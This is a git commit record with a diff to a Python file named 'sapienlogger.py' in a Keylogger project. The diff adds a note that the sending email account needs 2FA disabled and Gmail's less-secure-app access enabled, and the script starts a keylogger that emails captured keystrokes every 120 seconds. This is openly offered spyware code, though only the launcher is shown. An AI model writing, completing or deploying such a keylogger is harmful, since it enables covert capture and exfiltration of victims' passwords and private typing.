2a6dc6a0c32b6d2c5d325d97554996e3aa84c2c9
sapi3n-s3c <tyler.ceja5@gmail.com>
2021-09-22 19:12:37 -0400

    finishes script | fixes send email function

--- Keylogger/sapienlogger.py
+++ Keylogger/sapienlogger.py
@@ -1,5 +1,8 @@
 #!/usr/bin/env python
 import keylogger
-
+'''
+Must have 2FA turned off with email account
+If Gmail must have allow access to less secure apps enabled
+'''
 my_keylogger = keylogger.Keylogger(120, email, password)
 my_keylogger.start()
